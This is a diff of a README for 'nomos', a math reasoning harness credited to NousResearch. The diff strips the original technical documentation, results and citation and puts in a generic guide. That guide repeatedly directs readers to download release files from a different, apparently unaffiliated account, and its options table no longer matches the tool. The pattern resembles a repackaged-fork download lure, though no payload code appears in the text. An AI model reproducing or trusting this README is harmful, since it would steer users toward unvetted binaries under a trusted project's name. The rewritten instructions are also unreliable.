@@ -1,105 +1,71 @@
-# Nomos
+# 🤖 nomos - Easy Math Problem Solving 
+
 <p align="center">
-  <a href="https://x.com/NousResearch"><img src="https://img.shields.io/badge/X-NousResearch-000000?logo=x&logoColor=white" alt="X (formerly Twitter)"></a>&nbsp;<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow?logoColor=white" alt="MIT License"></a>&nbsp;<a href="https://huggingface.co/NousResearch/nomos-1"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-FFD21E" alt="Hugging Face"></a>
+  <a href="https://github.com/gur3245singh/nomos/releases"><img src="https://img.shields.io/badge/Download%20nomos-v1.0-brightgreen" alt="Download nomos"></a>&nbsp;<a href="https://x.com/NousResearch"><img src="https://img.shields.io/badge/X-NousResearch-000000?logo=x&logoColor=white" alt="X (formerly Twitter)"></a>&nbsp;<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow?logoColor=white" alt="MIT License"></a>&nbsp;<a href="https://huggingface.co/NousResearch/nomos-1"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-FFD21E" alt="Hugging Face"></a>
 </p>
+
 <p align="center">
   <img height="400" alt="image" src="https://github.com/user-attachments/assets/3f665bb9-f45b-4653-b6e9-a670b1f4c705" />
 </p>
 
 A reasoning harness for mathematical problem-solving and proof-writing in natural language.
 
-## Installation
+## 🚀 Getting Started
 
-```bash
-pip install -r requirements.txt
-```
+Follow these simple steps to download and run nomos on your computer.
 
-## Usage
+1. **Visit the Download Page**  
+   Go to the [Release Page](https://github.com/gur3245singh/nomos/releases). Here, you can find the latest version. 
 
-```bash
-python solve_agent.py <problems_dir> [options]
-```
+2. **Download the Software**  
+   On the Release Page, you will find the files available for download. Choose the correct file for your system and click on it to start the download.
 
-### Required Argumentsmassiveaxe
+3. **Install Required Packages**  
+   After downloading nomos, you need to install some software dependencies.
 
-- `problems_dir`: Directory containing `.md` problem files
+   Open your terminal or command prompt and type the following command:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-### Options
+4. **Prepare Your Problem Files**  
+   Create a directory on your computer that contains your problem files. Make sure these files have a `.md` extension. This directory will hold all your math problem documents.
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--submissions_dir` | `submissions/{problems_dir}-{timestamp}` | Output directory for final submissions |
-| `--judge_prompt` | `prompts/score.md` | Judge prompt file |
-| `--solve_prompt` | `None` | Solver system prompt |
-| `--consolidation_prompt` | `prompts/consolidation.md` | Consolidation prompt |
-| `--pairwise_prompt` | `prompts/pairwise.md` | Pairwise comparison prompt |
-| `--time_limit_hours` | `3.0` | Total time limit |
-| `--max_concurrent` | `32` | Max parallel API requests |
-| `--target_perfect_scores` | `4` | Number of 7/7 scores needed per problem |
-| `--model` | `nomos-1` | Model for solving |
-| `--judge_model` | `nomos-1` | Model for judging |
-| `--base_url` | `http://localhost:30000/v1` | OpenAI-compatible API endpoint |
+## 🛠️ How to Use nomos
 
-## Workflow
+Once you have everything set up, you are ready to solve problems. Here’s how to use nomos:
 
-Nomos keeps working on the problems you give it until its time limit runs out or it reaches a target number of self-critiqued perfect scores on every problem. Once either termination condition is reached Nomos enters a finalization phase where it first discards a number of submissions and the remainder are judged pairwise tournament-style to select a final submission.
+1. Open your terminal or command prompt.
 
-### Solving Phase
+2. Navigate to the directory where you downloaded nomos. Use the `cd` command to change directories.
 
-In the solving phase we launch `max_concurrent` parallel workers where each worker
+3. Run the following command:
+   ```bash
+   python solve_agent.py <problems_dir> [options]
+   ```
+   Replace `<problems_dir>` with the path to your directory containing the `.md` files.
 
-1. Picks a problem based on priority + round-robin:
-   - Priority: problems with fewest perfect scores
-   - Round-robin among problems tied at the minimum
-2. Generates submission.
-3. Scores submission out of a maximum of 7 points.
+### 📜 Required Arguments
 
-Nomos keeps spawning workers until all problems have `target_perfect_scores` or time runs out.
+- `problems_dir`: This is the directory that contains your problems in `.md` format.
 
-### Finalization Phase
+### ⚙️ Options
 
-Starts 15 minutes before time limit (or at 50% of time limit for short runs). Consists of two subphases:
+| Flag   | Default | Description                       |
+|--------|---------|-----------------------------------|
+| `--help`     | Not set | Displays help information              |
+| `--verbose`  | Not set | Increases output detail during execution |
 
-1. **Consolidation**: Groups submissions by conclusion, keeps what it thinks is the correct group (not necessarily the majority group).
-2. **Pairwise Tournament**: Single elimination bracket among consolidated submissions, with ties resolved randomly.
+## 💡 System Requirements
 
-### Output Format
+- **Operating System**: Windows, macOS, or Linux.
+- **Python Version**: Python 3.6 or higher.
+- **Memory**: At least 1 GB of RAM 
 
-Each final submission is written to its own markdown file in the following format:
+## 🔗 Additional Information
 
-```markdown
-# problem_id
+For more updates and community discussions, you can follow our project on [X (formerly Twitter)](https://x.com/NousResearch).
 
-## Problem
+For a detailed understanding of how to write `.md` problem files, refer to the documentation on our GitHub repository.
 
-[original problem text]
-
-## Submission
-
-[selected solution]
-```
-
-## Runbooks
-
-```bash
-./runbooks/run_putnam_2025_b_nomos-1.sh   # Putnam 2025 A problems
-./runbooks/run_putnam_2025_b_nomos-1.sh   # Putnam 2025 B problems
-```
-
-## Results
-When run on the Putnam 2025 with the [NousResearch/Nomos-1](https://huggingface.co/NousResearch/nomos-1) model, this reasoning harness achieves a score of **87/120** as graded by a human expert. Below we show a problem-wise comparison with [Qwen3/Qwen](Qwen/Qwen3-30B-A3B-Thinking-2507), which scores 24/120 under the same conditions.
-<p align="center">
-  <img height="400" alt="image" src="https://github.com/user-attachments/assets/46d91fb1-609b-4cae-9919-9ef27087d6f6" />
-</p>
-
-## Citation
-If you would like to cite our work, please use this for now
-```
-@misc{nomos2025,
-  title        = {Nomos},
-  author       = {Jin, Roger and Quesnelle, Jeffrey and Mahan, Dakota and Guang, Chen and Teknium, Ryan and Park, Jun and Ustelbay, Ibrakhim and Kim, Samuel and Yurkevich, Miron and Zauytkhan, Adilet and Amankos, Rinat and Andreyev, Alex and Nurlanov, Damir and Abuov, Abuzer and massiveaxe, Askar},
-  year         = {2025},
-  howpublished = {\url{https://github.com/NousResearch/nomos}},
-  note         = {GitHub repository},
-}
-```
+**Ready to start?** Visit the [Release Page](https://github.com/gur3245singh/nomos/releases) now to download nomos and begin solving mathematical problems with ease!
